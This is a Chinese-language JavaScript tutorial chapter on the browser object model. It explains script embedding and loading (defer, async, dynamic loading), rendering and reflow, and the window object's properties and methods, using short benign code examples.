---
icon: js
category: Web前端
tag: JS进阶教程
time: 2021-8-1
footer: 一切都是最好的安排
title: 23.BOM
---

# BOM

## 浏览器环境概述

### 代码嵌入网页的方法

网页中嵌入 JavaScript 代码，主要有四种方法：

- `<script>`元素直接嵌入代码。
- `<script>`标签加载外部脚本
- 事件属性
- URL 协议

#### script 元素嵌入代码

`<script>`元素内部可以直接写入 JavaScript 代码。

```html
<script>
  var x = 1 + 5;
  console.log(x);
</script>
```

`<script>`标签有一个type属性，用来指定脚本类型。对 JavaScript 脚本来说，type属性可以设为两种值。

- `text/javascript`：这是默认值，也是历史上一贯设定的值。如果你省略`type`属性，默认就是这个值。对于老式浏览器，设为这个值比较好。
- `application/javascript`：对于较新的浏览器，建议设为这个值。

```html
<script type="application/javascript">
  console.log('Hello World');
</script>
```

由于`<script>`标签默认就是 JavaScript 代码。所以，嵌入 JavaScript 脚本时，`type`属性可以省略。

如果`type`属性的值，浏览器不认识，那么它不会执行其中的代码。利用这一点，可以在`<script>`标签之中嵌入任意的文本内容，只要加上一个浏览器不认识的`type`属性即可。

```html
<script id="mydata" type="x-custom-data">
  console.log('Hello World');
</script>
```

上面的代码，浏览器不会执行，也不会显示它的内容，因为不认识它的`type`属性。但是，这个`<script>`节点依然存在于 DOM 之中，可以使用`<script>`节点的`text`属性读出它的内容。

```js
document.getElementById('mydata').text
//   console.log('Hello World');
```

#### script 元素加载外部脚本

`<script>`标签也可以指定加载外部的脚本文件。

```html
<script src="https://www.example.com/script.js"></script>
```

如果脚本文件使用了非英语字符，还应该注明字符的编码。

```html
<script charset="utf-8" src="https://www.example.com/script.js"></script>
```

所加载的脚本必须是纯的 JavaScript 代码，不能有`HTML`代码和`<script>`标签。

加载外部脚本和直接添加代码块，这两种方法不能混用。下面代码的`console.log`语句直接被忽略。

```html
<script charset="utf-8" src="example.js">
  console.log('Hello World!');
</script>
```

为了防止攻击者篡改外部脚本，`script`标签允许设置一个`integrity`属性，写入该外部脚本的 Hash 签名，用来验证脚本的一致性。

```html
<script src="/assets/application.js"
  integrity="sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=">
</script>
```

上面代码中，`script`标签有一个`integrity`属性，指定了外部脚本`/assets/application.js`的 SHA256 签名。一旦有人改了这个脚本，导致 SHA256 签名不匹配，浏览器就会拒绝加载。

### 事件属性

网页元素的事件属性（比如`onclick`和`onmouseover`），可以写入 JavaScript 代码。当指定事件发生时，就会调用这些代码。

```html
<button id="myBtn" onclick="console.log(this.id)">点击</button>
```

上面的事件属性代码只有一个语句。如果有多个语句，使用分号分隔即可。

### URL 协议

URL 支持`javascript:`协议，即在 URL 的位置写入代码，使用这个 URL 的时候就会执行 JavaScript 代码。

```html
<a href="javascript:console.log('Hello')">点击</a>
```

浏览器的地址栏也可以执行`javascript:`协议。将`javascript:console.log('Hello')`放入地址栏，按回车键也会执行这段代码。

如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串的内容，原有文档的内容都会消失。

```html
<a href="javascript: new Date().toLocaleTimeString();">点击</a>
```

上面代码中，用户点击链接以后，会打开一个新文档，里面有当前时间。

如果返回的不是字符串，那么浏览器不会新建文档，也不会跳转。

```html
<a href="javascript: console.log(new Date().toLocaleTimeString())">点击</a>
```

上面代码中，用户点击链接后，网页不会跳转，只会在控制台显示当前时间。

`javascript:`协议的常见用途是书签脚本 Bookmarklet。由于浏览器的书签保存的是一个网址，所以`javascript:`网址也可以保存在里面，用户选择这个书签的时候，就会在当前页面执行这个脚本。为了防止书签替换掉当前文档，可以在脚本前加上`void`，或者在脚本最后加上`void 0`。

```html
<a href="javascript: void new Date().toLocaleTimeString();">点击</a>
<a href="javascript: new Date().toLocaleTimeString();void 0;">点击</a>
```

上面这两种写法，点击链接后，执行代码都不会网页跳转。

### script 元素

#### 工作原理

浏览器加载 JavaScript 脚本，主要通过`<script>`元素完成。正常的网页加载流程是这样的。

1. 浏览器一边下载 HTML 网页，一边开始解析。也就是说，不等到下载完，就开始解析。
2. 解析过程中，浏览器发现`<script>`元素，就暂停解析，把网页渲染的控制权转交给 JavaScript 引擎。
3. 如果`<script>`元素引用了外部脚本，就下载该脚本再执行，否则就直接执行代码。
4. JavaScript 引擎执行完毕，控制权交还渲染引擎，恢复往下解析 HTML 网页。

加载外部脚本时，浏览器会暂停页面渲染，等待脚本下载并执行完成后，再继续渲染。原因是 JavaScript 代码可以修改 DOM，所以必须把控制权让给它，否则会导致复杂的线程竞赛的问题。

如果外部脚本加载时间很长（一直无法完成下载），那么浏览器就会一直等待脚本下载完成，造成网页长时间失去响应，浏览器就会呈现“假死”状态，这被称为“阻塞效应”。

为了避免这种情况，较好的做法是将`<script>`标签都放在页面底部，而不是头部。这样即使遇到脚本失去响应，网页主体的渲染也已经完成了，用户至少可以看到内容，而不是面对一张空白的页面。如果某些脚本代码非常重要，一定要放在页面头部的话，最好直接将代码写入页面，而不是连接外部脚本文件，这样能缩短加载时间。

脚本文件都放在网页尾部加载，还有一个好处。因为在 DOM 结构生成之前就调用 DOM 节点，JavaScript 会报错，如果脚本都在网页尾部加载，就不存在这个问题，因为这时 DOM 肯定已经生成了。

```html
<head>
  <script>
    console.log(document.body.innerHTML);
  </script>
</head>
<body>
</body>
```

上面代码执行时会报错，因为此时`document.body`元素还未生成。

一种解决方法是设定`DOMContentLoaded`事件的回调函数。

```html
<head>
  <script>
    document.addEventListener(
      'DOMContentLoaded',
      function (event) {
        console.log(document.body.innerHTML);
      }
    );
  </script>
</head>
```

上面代码中，指定`DOMContentLoaded`事件发生后，才开始执行相关代码。`DOMContentLoaded`事件只有在 DOM 结构生成之后才会触发。

另一种解决方法是，使用`<script>`标签的`onload`属性。当`<script>`标签指定的外部脚本文件下载和解析完成，会触发一个`load`事件，可以把所需执行的代码，放在这个事件的回调函数里面。

```html
<script src="jquery.min.js" onload="console.log(document.body.innerHTML)">
</script>
```

但是，如果将脚本放在页面底部，就可以完全按照正常的方式写，上面两种方式都不需要。

```html
<body>
  <!-- 其他代码  -->
  <script>
    console.log(document.body.innerHTML);
  </script>
</body>
```

如果有多个`script`标签，比如下面这样。

```html
<script src="a.js"></script>
<script src="b.js"></script>
```

浏览器会同时并行下载`a.js`和`b.js`，但是，执行时会保证先执行`a.js`，然后再执行`b.js`，即使后者先下载完成，也是如此。也就是说，脚本的执行顺序由它们在页面中的出现顺序决定，这是为了保证脚本之间的依赖关系不受到破坏。当然，加载这两个脚本都会产生“阻塞效应”，必须等到它们都加载完成，浏览器才会继续页面渲染。

解析和执行 CSS，也会产生阻塞。Firefox 浏览器会等到脚本前面的所有样式表，都下载并解析完，再执行脚本；Webkit则是一旦发现脚本引用了样式，就会暂停执行脚本，等到样式表下载并解析完，再恢复执行。

此外，对于来自同一个域名的资源，比如脚本文件、样式表文件、图片文件等，浏览器一般有限制，同时最多下载6～20个资源，即最多同时打开的 TCP 连接有限制，这是为了防止对服务器造成太大压力。如果是来自不同域名的资源，就没有这个限制。所以，通常把静态文件放在不同的域名之下，以加快下载速度。

#### defer 属性

为了解决脚本文件下载阻塞网页渲染的问题，一个方法是对`<script>`元素加入`defer`属性。它的作用是延迟脚本的执行，等到 DOM 加载生成后，再执行脚本。

```html
<script src="a.js" defer></script>
<script src="b.js" defer></script>
```

上面代码中，只有等到 DOM 加载完成后，才会执行`a.js`和`b.js`。

`defer`属性的运行流程如下。

1. 浏览器开始解析 HTML 网页。
2. 解析过程中，发现带有`defer`属性的`<script>`元素。
3. 浏览器继续往下解析 HTML 网页，同时并行下载`<script>`元素加载的外部脚本。
4. 浏览器完成解析 HTML 网页，此时再回过头执行已经下载完成的脚本。

有了`defer`属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的脚本文件在`DOMContentLoaded`事件触发前执行（即刚刚读取完`</html>`标签），而且可以保证执行顺序就是它们在页面上出现的顺序。

对于内置而不是加载外部脚本的`script`标签，以及动态生成的`script`标签，`defer`属性不起作用。另外，使用`defer`加载的外部脚本不应该使用`document.write`方法。

#### async 属性

解决“阻塞效应”的另一个方法是对`<script>`元素加入`async`属性。

```html
<script src="a.js" async></script>
<script src="b.js" async></script>
```

`async`属性的作用是，使用另一个进程下载脚本，下载时不会阻塞渲染。

1. 浏览器开始解析 HTML 网页。
2. 解析过程中，发现带有`async`属性的`script`标签。
3. 浏览器继续往下解析 HTML 网页，同时并行下载`<script>`标签中的外部脚本。
4. 脚本下载完成，浏览器暂停解析 HTML 网页，开始执行下载的脚本。
5. 脚本执行完毕，浏览器恢复解析 HTML 网页。

`async`属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，就无法保证脚本的执行顺序。哪个脚本先下载结束，就先执行那个脚本。另外，使用`async`属性的脚本文件里面的代码，不应该使用`document.write`方法。

`defer`属性和`async`属性到底应该使用哪一个？

一般来说，如果脚本之间没有依赖关系，就使用`async`属性，如果脚本之间有依赖关系，就使用`defer`属性。如果同时使用`async`和`defer`属性，后者不起作用，浏览器行为由`async`属性决定。

#### 脚本的动态加载

`<script>`元素还可以动态生成，生成后再插入页面，从而实现脚本的动态加载。

```js
['a.js', 'b.js'].forEach(function(src) {
  var script = document.createElement('script');
  script.src = src;
  document.head.appendChild(script);
});
```

这种方法的好处是，动态生成的`script`标签不会阻塞页面渲染，也就不会造成浏览器假死。但是问题在于，这种方法无法保证脚本的执行顺序，哪个脚本文件先下载完成，就先执行哪个。

如果想避免这个问题，可以设置async属性为`false`。

```js
['a.js', 'b.js'].forEach(function(src) {
  var script = document.createElement('script');
  script.src = src;
  script.async = false;
  document.head.appendChild(script);
});
```

上面的代码不会阻塞页面渲染，而且可以保证`b.js`在`a.js`后面执行。不过需要注意的是，在这段代码后面加载的脚本文件，会因此都等待`b.js`执行完成后再执行。

如果想为动态加载的脚本指定回调函数，可以使用下面的写法。

```js
function loadScript(src, done) {
  var js = document.createElement('script');
  js.src = src;
  js.onload = function() {
    done();
  };
  js.onerror = function() {
    done(new Error('Failed to load script ' + src));
  };
  document.head.appendChild(js);
}
```

#### 加载使用的协议

如果不指定协议，浏览器默认采用 HTTP 协议下载。

```html
<script src="example.js"></script>
```

上面的`example.js`默认就是采用 HTTP 协议下载，如果要采用 HTTPS 协议下载，必需写明。

```html
<script src="https://example.js"></script>
```

但是有时我们会希望，根据页面本身的协议来决定加载协议，这时可以采用下面的写法。

```html
<script src="//example.js"></script>
```

### 浏览器的组成

浏览器的核心是两部分：渲染引擎和 JavaScript 解释器（又称 JavaScript 引擎）。

#### 渲染引擎

渲染引擎的主要作用是，将网页代码渲染为用户视觉可以感知的平面文档。

不同的浏览器有不同的渲染引擎。

- Firefox：Gecko 引擎
- Safari：WebKit 引擎
- Chrome：Blink 引擎
- IE: Trident 引擎
- Edge: EdgeHTML 引擎

渲染引擎处理网页，通常分成四个阶段。

1. 解析代码：HTML 代码解析为 DOM，CSS 代码解析为 CSSOM（CSS Object Model）。
2. 对象合成：将 DOM 和 CSSOM 合成一棵渲染树（render tree）。
3. 布局：计算出渲染树的布局（layout）。
4. 绘制：将渲染树绘制到屏幕。

以上四步并非严格按顺序执行，往往第一步还没完成，第二步和第三步就已经开始了。所以，会看到这种情况：网页的 HTML 代码还没下载完，但浏览器已经显示出内容了。

#### 重流和重绘

渲染树转换为网页布局，称为“布局流”（flow）；布局显示到页面的这个过程，称为“绘制”（paint）。它们都具有阻塞效应，并且会耗费很多时间和计算资源。

页面生成以后，脚本操作和样式表操作，都会触发“重流”（reflow）和“重绘”（repaint）。用户的互动也会触发重流和重绘，比如设置了鼠标悬停（`a:hover`）效果、页面滚动、在输入框中输入文本、改变窗口大小等等。

重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。

大多数情况下，浏览器会智能判断，将重流和重绘只限制到相关的子树上面，最小化所耗费的代价，而不会全局重新生成网页。

作为开发者，应该尽量设法降低重绘的次数和成本。比如，尽量不要变动高层的 DOM 元素，而以底层 DOM 元素的变动代替；再比如，重绘`table`布局和`flex`布局，开销都会比较大。

```js
var foo = document.getElementById('foobar');

foo.style.color = 'blue';
foo.style.marginTop = '30px';
```

上面的代码只会导致一次重绘，因为浏览器会累积 DOM 变动，然后一次性执行。

下面是一些优化技巧：

- 读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。
- 缓存 DOM 信息。
- 不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。
- 使用`documentFragment`操作 DOM
- 动画使用`absolute`定位或`fixed`定位，这样可以减少对其他元素的影响。
- 只在必要时才显示隐藏元素。
- 使用`window.requestAnimationFrame()`，因为它可以把代码推迟到下一次重绘之前执行，而不是立即要求页面重绘。
- 使用虚拟 DOM（virtual DOM）库。

下面是一个`window.requestAnimationFrame()`对比效果的例子。

```js
// 重流代价高
function doubleHeight(element) {
  var currentHeight = element.clientHeight;
  element.style.height = (currentHeight * 2) + 'px';
}

all_my_elements.forEach(doubleHeight);

// 重绘代价低
function doubleHeight(element) {
  var currentHeight = element.clientHeight;

  window.requestAnimationFrame(function () {
    element.style.height = (currentHeight * 2) + 'px';
  });
}

all_my_elements.forEach(doubleHeight);
```

上面的第一段代码，每读一次 DOM，就写入新的值，会造成不停的重排和重流。第二段代码把所有的写操作，都累积在一起，从而 DOM 代码变动的代价就最小化了。

#### JavaScript 引擎

JavaScript 引擎的主要作用是，读取网页中的 JavaScript 代码，对其处理后运行。

JavaScript 是一种解释型语言，也就是说，它不需要编译，由解释器实时运行。这样的好处是运行和修改都比较方便，刷新页面就可以重新解释；缺点是每次运行都要调用解释器，系统开销较大，运行速度慢于编译型语言。

为了提高运行速度，目前的浏览器都将 JavaScript 进行一定程度的编译，生成类似字节码（bytecode）的中间代码，以提高运行速度。

早期，浏览器内部对 JavaScript 的处理过程如下：

1. 读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。
2. 对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。
3. 使用“翻译器”（translator），将代码转为字节码（bytecode）。
4. 使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。

逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。

字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，有的 JavaScript 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些 JavaScript 虚拟机：

- [Chakra](https://en.wikipedia.org/wiki/Chakra_(JScript_engine)) (Microsoft Internet Explorer)
- [Nitro/JavaScript Core](https://en.wikipedia.org/wiki/WebKit#JavaScriptCore) (Safari)
- [Carakan](https://dev.opera.com/articles/view/labs-carakan/) (Opera)
- [SpiderMonkey](https://developer.mozilla.org/en-US/docs/SpiderMonkey) (Firefox)
- [V8](https://en.wikipedia.org/wiki/Chrome_V8) (Chrome, Chromium)

## Window 对象

### 概述

浏览器里面，`window`对象（注意，`w`为小写）指当前的浏览器窗口。它也是当前页面的顶层对象，即最高一层的对象，所有其他对象都是它的下属。一个变量如果未声明，那么默认就是顶层对象的属性。

```js
a = 1;
window.a // 1
```

上面代码中，`a`是一个没有声明就直接赋值的变量，它自动成为顶层对象的属性。

`window`有自己的实体含义，其实不适合当作最高一层的顶层对象，这是一个语言的设计失误。最早，设计这门语言的时候，原始设想是语言内置的对象越少越好，这样可以提高浏览器的性能。因此，语言设计者 Brendan Eich 就把`window`对象当作顶层对象，所有未声明就赋值的变量都自动变成`window`对象的属性。这种设计使得编译阶段无法检测出未声明变量，但到了今天已经没有办法纠正了。

### window 对象的属性

#### window.name

`window.name`属性是一个字符串，表示当前浏览器窗口的名字。窗口不一定需要名字，这个属性主要配合超链接和表单的`target`属性使用。

```js
window.name = 'Hello World!';
console.log(window.name)
// "Hello World!"
```

该属性只能保存字符串，如果写入的值不是字符串，会自动转成字符串。各个浏览器对这个值的储存容量有所不同，但是一般来说，可以高达几MB。

只要浏览器窗口不关闭，这个属性是不会消失的。举例来说，访问`a.com`时，该页面的脚本设置了`window.name`，接下来在同一个窗口里面载入了`b.com`，新页面的脚本可以读到上一个网页设置的`window.name`。页面刷新也是这种情况。一旦浏览器窗口关闭后，该属性保存的值就会消失，因为这时窗口已经不存在了。

#### window.closed，window.opener

`window.closed`属性返回一个布尔值，表示窗口是否关闭。

```js
window.closed // false
```

上面代码检查当前窗口是否关闭。这种检查意义不大，因为只要能运行代码，当前窗口肯定没有关闭。这个属性一般用来检查，使用脚本打开的新窗口是否关闭。

```js
var popup = window.open();

if ((popup !== null) && !popup.closed) {
  // 窗口仍然打开着
}
```

`window.opener`属性表示打开当前窗口的父窗口。如果当前窗口没有父窗口（即直接在地址栏输入打开），则返回`null`。

```js
window.open().opener === window // true
```

上面表达式会打开一个新窗口，然后返回`true`。

如果两个窗口之间不需要通信，建议将子窗口的`opener`属性显式设为`null`，这样可以减少一些安全隐患。

```js
var newWin = window.open('example.html', 'newWindow', 'height=400,width=400');
newWin.opener = null;
```

上面代码中，子窗口的`opener`属性设为`null`，两个窗口之间就没办法再联系了。

通过`opener`属性，可以获得父窗口的全局属性和方法，但只限于两个窗口同源的情况（参见《同源限制》一章），且其中一个窗口由另一个打开。`<a>`元素添加`rel="noopener"`属性，可以防止新打开的窗口获取父窗口，减轻被恶意网站修改父窗口 URL 的风险。

```js
<a href="https://an.evil.site" target="_blank" rel="noopener">
恶意网站
</a>
```

#### window.self，window.window

`window.self`和`window.window`属性都指向窗口本身。这两个属性只读。

```js
window.self === window // true
window.window === window // true
```

#### window.frames，window.length

`window.frames`属性返回一个类似数组的对象，成员为页面内所有框架窗口，包括`frame`元素和`iframe`元素。`window.frames[0]`表示页面中第一个框架窗口。

如果`iframe`元素设置了`id`或`name`属性，那么就可以用属性值，引用这个`iframe`窗口。比如`<iframe name="myIFrame">`可以用`frames['myIFrame']`或者`frames.myIFrame`来引用。

`frames`属性实际上是`window`对象的别名。

```js
frames === window // true
```

因此，`frames[0]`也可以用`window[0]`表示。但是，从语义上看，`frames`更清晰，而且考虑到`window`还是全局对象，因此推荐表示多窗口时，总是使用`frames[0]`的写法。更多介绍请看下文的《多窗口操作》部分。

`window.length`属性返回当前网页包含的框架总数。如果当前网页不包含`frame`和`iframe`元素，那么`window.length`就返回`0`。

```js
window.frames.length === window.length // true
```

上面代码表示，`window.frames.length`与`window.length`应该是相等的。

#### window.frameElement

`window.frameElement`属性主要用于当前窗口嵌在另一个网页的情况（嵌入`<object>`、`<iframe>`或`<embed>`元素），返回当前窗口所在的那个元素节点。如果当前窗口是顶层窗口，或者所嵌入的那个网页不是同源的，该属性返回`null`。

```js
// HTML 代码如下
// <iframe src="about.html"></iframe>

// 下面的脚本在 about.html 里面
var frameEl = window.frameElement;
if (frameEl) {
  frameEl.src = 'other.html';
}
```

上面代码中，`frameEl`变量就是`<iframe>`元素。

#### window.top，window.parent

`window.top`属性指向最顶层窗口，主要用于在框架窗口（frame）里面获取顶层窗口。

`window.parent`属性指向父窗口。如果当前窗口没有父窗口，`window.parent`指向自身。

```js
if (window.parent !== window.top) {
  // 表明当前窗口嵌入不止一层
}
```

对于不包含框架的网页，这两个属性等同于`window`对象。

#### window.status

`window.status`属性用于读写浏览器状态栏的文本。但是，现在很多浏览器都不允许改写状态栏文本，所以使用这个方法不一定有效。

#### window.devicePixelRatio

`window.devicePixelRatio`属性返回一个数值，表示一个 CSS 像素的大小与一个物理像素的大小之间的比率。也就是说，它表示一个 CSS 像素由多少个物理像素组成。它可以用于判断用户的显示环境，如果这个比率较大，就表示用户正在使用高清屏幕，因此可以显示较大像素的图片。

#### 位置大小属性

以下属性返回`window`对象的位置信息和大小信息。

**（1）window.screenX，window.screenY **

`window.screenX`和`window.screenY`属性，返回浏览器窗口左上角相对于当前屏幕左上角的水平距离和垂直距离（单位像素）。这两个属性只读。

**（2） window.innerHeight，window.innerWidth**

`window.innerHeight`和`window.innerWidth`属性，返回网页在当前窗口中可见部分的高度和宽度，即“视口”（viewport）的大小（单位像素）。这两个属性只读。

用户放大网页的时候（比如将网页从100%的大小放大为200%），这两个属性会变小。因为这时网页的像素大小不变（比如宽度还是960像素），只是每个像素占据的屏幕空间变大了，因此可见部分（视口）就变小了。

注意，这两个属性值包括滚动条的高度和宽度。

**（3）window.outerHeight，window.outerWidth**

`window.outerHeight`和`window.outerWidth`属性返回浏览器窗口的高度和宽度，包括浏览器菜单和边框（单位像素）。这两个属性只读。

**（4）window.scrollX，window.scrollY**

`window.scrollX`属性返回页面的水平滚动距离，`window.scrollY`属性返回页面的垂直滚动距离，单位都为像素。这两个属性只读。

注意，这两个属性的返回值不是整数，而是双精度浮点数。如果页面没有滚动，它们的值就是`0`。

举例来说，如果用户向下拉动了垂直滚动条75像素，那么`window.scrollY`就是75左右。用户水平向右拉动水平滚动条200像素，`window.scrollX`就是200左右。

```js
if (window.scrollY < 75) {
  window.scroll(0, 75);
}
```

上面代码中，如果页面向下滚动的距离小于75像素，那么页面向下滚动75像素。

**（5）window.pageXOffset，window.pageYOffset**

`window.pageXOffset`属性和`window.pageYOffset`属性，是`window.scrollX`和`window.scrollY`别名。

#### 组件属性

组件属性返回浏览器的组件对象。这样的属性有下面几个。

- `window.locationbar`：地址栏对象
- `window.menubar`：菜单栏对象
- `window.scrollbars`：窗口的滚动条对象
- `window.toolbar`：工具栏对象
- `window.statusbar`：状态栏对象
- `window.personalbar`：用户安装的个人工具栏对象

这些对象的`visible`属性是一个布尔值，表示这些组件是否可见。这些属性只读。

```js
window.locationbar.visible
window.menubar.visible
window.scrollbars.visible
window.toolbar.visible
window.statusbar.visible
window.personalbar.visible
```

#### 全局对象属性

全局对象属性指向一些浏览器原生的全局对象。

- `window.document`：指向`document`对象，详见《document 对象》一章。注意，这个属性有同源限制。只有来自同源的脚本才能读取这个属性。
- `window.location`：指向`Location`对象，用于获取当前窗口的 URL 信息。它等同于`document.location`属性，详见《Location 对象》一章。
- `window.navigator`：指向`Navigator`对象，用于获取环境信息，详见《Navigator 对象》一章。
- `window.history`：指向`History`对象，表示浏览器的浏览历史，详见《History 对象》一章。
- `window.localStorage`：指向本地储存的 localStorage 数据，详见《Storage 接口》一章。
- `window.sessionStorage`：指向本地储存的 sessionStorage 数据，详见《Storage 接口》一章。
- `window.console`：指向`console`对象，用于操作控制台，详见《console 对象》一章。
- `window.screen`：指向`Screen`对象，表示屏幕信息，详见《Screen 对象》一章。

#### window.isSecureContext

`window.isSecureContext`属性返回一个布尔值，表示当前窗口是否处在加密环境。如果是 HTTPS 协议，就是`true`，否则就是`false`。

### window 对象的方法

#### window.alert()，window.prompt()，window.confirm()

`window.alert()`、`window.prompt()`、`window.confirm()`都是浏览器与用户互动的全局方法。它们会弹出不同的对话框，要求用户做出回应。注意，这三个方法弹出的对话框，都是浏览器统一规定的式样，无法定制。

**（1）window.alert()**

`window.alert()`方法弹出的对话框，只有一个“确定”按钮，往往用来通知用户某些信息。

```js
window.alert('Hello World');
```

用户只有点击“确定”按钮，对话框才会消失。对话框弹出期间，浏览器窗口处于冻结状态，如果不点“确定”按钮，用户什么也干不了。

`window.alert()`方法的参数只能是字符串，没法使用 CSS 样式，但是可以用`\n`指定换行。

```js
alert('本条提示\n分成两行');
```

**（2）window.prompt()**

`window.prompt()`方法弹出的对话框，提示文字的下方，还有一个输入框，要求用户输入信息，并有“确定”和“取消”两个按钮。它往往用来获取用户输入的数据。

```js
var result = prompt('您的年龄？', 25)
```

上面代码会跳出一个对话框，文字提示为“您的年龄？”，要求用户在对话框中输入自己的年龄（默认显示25）。用户填入的值，会作为返回值存入变量`result`。

`window.prompt()`的返回值有两种情况，可能是字符串（有可能是空字符串），也有可能是`null`。具体分成三种情况。

1. 用户输入信息，并点击“确定”，则用户输入的信息就是返回值。
2. 用户没有输入信息，直接点击“确定”，则输入框的默认值就是返回值。
3. 用户点击了“取消”（或者按了 ESC 按钮），则返回值是`null`。

`window.prompt()`方法的第二个参数是可选的，但是最好总是提供第二个参数，作为输入框的默认值。

**（3）window.confirm()**

`window.confirm()`方法弹出的对话框，除了提示信息之外，只有“确定”和“取消”两个按钮，往往用来征询用户是否同意。

```js
var result = confirm('你最近好吗？');
```

上面代码弹出一个对话框，上面只有一行文字“你最近好吗？”，用户选择点击“确定”或“取消”。

`confirm`方法返回一个布尔值，如果用户点击“确定”，返回`true`；如果用户点击“取消”，则返回`false`。

```js
var okay = confirm('Please confirm this message.');
if (okay) {
  // 用户按下“确定”
} else {
  // 用户按下“取消”
}
```

`confirm`的一个用途是，用户离开当前页面时，弹出一个对话框，问用户是否真的要离开。

```js
window.onunload = function () {
  return window.confirm('你确定要离开当面页面吗？');
}
```

这三个方法都具有堵塞效应，一旦弹出对话框，整个页面就是暂停执行，等待用户做出反应。

#### window.open(), window.close()，window.stop()

**（1）window.open()**

`window.open`方法用于新建另一个浏览器窗口，类似于浏览器菜单的新建窗口选项。它会返回新窗口的引用，如果无法新建窗口，则返回`null`。

```js
var popup = window.open('somefile.html');
```

上面代码会让浏览器弹出一个新建窗口，网址是当前域名下的`somefile.html`。

`open`方法一共可以接受三个参数。

```js
window.open(url, windowName, [windowFeatures])
```

- `url`：字符串，表示新窗口的网址。如果省略，默认网址就是`about:blank`。
- `windowName`：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则占用该窗口，不再新建窗口。如果省略，就默认使用`_blank`，表示新建一个没有名字的窗口。另外还有几个预设值，`_self`表示当前窗口，`_top`表示顶层窗口，`_parent`表示上一层窗口。
- `windowFeatures`：字符串，内容为逗号分隔的键值对（详见下文），表示新窗口的参数，比如有没有提示栏、工具条等等。如果省略，则默认打开一个完整 UI 的新窗口。如果新建的是一个已经存在的窗口，则该参数不起作用，浏览器沿用以前窗口的参数。

下面是一个例子。

```js
var popup = window.open(
  'somepage.html',
  'DefinitionsWindows',
  'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
);
```

上面代码表示，打开的新窗口高度和宽度都为200像素，没有地址栏，但有状态栏和滚动条，允许用户调整大小。

第三个参数可以设定如下属性。

- left：新窗口距离屏幕最左边的距离（单位像素）。注意，新窗口必须是可见的，不能设置在屏幕以外的位置。
- top：新窗口距离屏幕最顶部的距离（单位像素）。
- height：新窗口内容区域的高度（单位像素），不得小于100。
- width：新窗口内容区域的宽度（单位像素），不得小于100。
- outerHeight：整个浏览器窗口的高度（单位像素），不得小于100。
- outerWidth：整个浏览器窗口的宽度（单位像素），不得小于100。
- menubar：是否显示菜单栏。
- toolbar：是否显示工具栏。
- location：是否显示地址栏。
- personalbar：是否显示用户自己安装的工具栏。
- status：是否显示状态栏。
- dependent：是否依赖父窗口。如果依赖，那么父窗口最小化，该窗口也最小化；父窗口关闭，该窗口也关闭。
- minimizable：是否有最小化按钮，前提是`dialog=yes`。
- noopener：新窗口将与父窗口切断联系，即新窗口的`window.opener`属性返回`null`，父窗口的`window.open()`方法也返回`null`。
- resizable：新窗口是否可以调节大小。
- scrollbars：是否允许新窗口出现滚动条。
- dialog：新窗口标题栏是否出现最大化、最小化、恢复原始大小的控件。
- titlebar：新窗口是否显示标题栏。
- alwaysRaised：是否显示在所有窗口的顶部。
- alwaysLowered：是否显示在父窗口的底下。
- close：新窗口是否显示关闭按钮。

对于那些可以打开和关闭的属性，设为`yes`或`1`或不设任何值就表示打开，比如`status=yes`、`status=1`、`status`都会得到同样的结果。如果想设为关闭，不用写`no`，而是直接省略这个属性即可。也就是说，如果在第三个参数中设置了一部分属性，其他没有被设置的`yes/no`属性都会被设成`no`，只有`titlebar`和关闭按钮除外（它们的值默认为`yes`）。

上面这些属性，属性名与属性值之间用等号连接，属性与属性之间用逗号分隔。

```js
'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
```

另外，`open()`方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口被当前网页打开的情况下，才允许`open`方法指向该窗口。

`window.open`方法返回新窗口的引用。

```js
var windowB = window.open('windowB.html', 'WindowB');
windowB.window.name // "WindowB"
```

注意，如果新窗口和父窗口不是同源的（即不在同一个域），它们彼此不能获取对方窗口对象的内部属性。

下面是另一个例子。

```js
var w = window.open();
console.log('已经打开新窗口');
w.location = 'http://example.com';
```

上面代码先打开一个新窗口，然后在该窗口弹出一个对话框，再将网址导向`example.com`。

由于`open`这个方法很容易被滥用，许多浏览器默认都不允许脚本自动新建窗口。只允许在用户点击链接或按钮时，脚本做出反应，弹出新窗口。因此，有必要检查一下打开新窗口是否成功。

```js
var popup = window.open();
if (popup === null) {
  // 新建窗口失败
}
```

**（2）window.close()**

`window.close`方法用于关闭当前窗口，一般只用来关闭`window.open`方法新建的窗口。

```js
popup.close()
```

该方法只对顶层窗口有效，`iframe`框架之中的窗口使用该方法无效。

**（3）window.stop()**

`window.stop()`方法完全等同于单击浏览器的停止按钮，会停止加载图像、视频等正在或等待加载的对象。

```js
window.stop()
```

#### window.moveTo()，window.moveBy()

`window.moveTo()`方法用于移动浏览器窗口到指定位置。它接受两个参数，分别是窗口左上角距离屏幕左上角的水平距离和垂直距离，单位为像素。

```js
window.moveTo(100, 200)
```

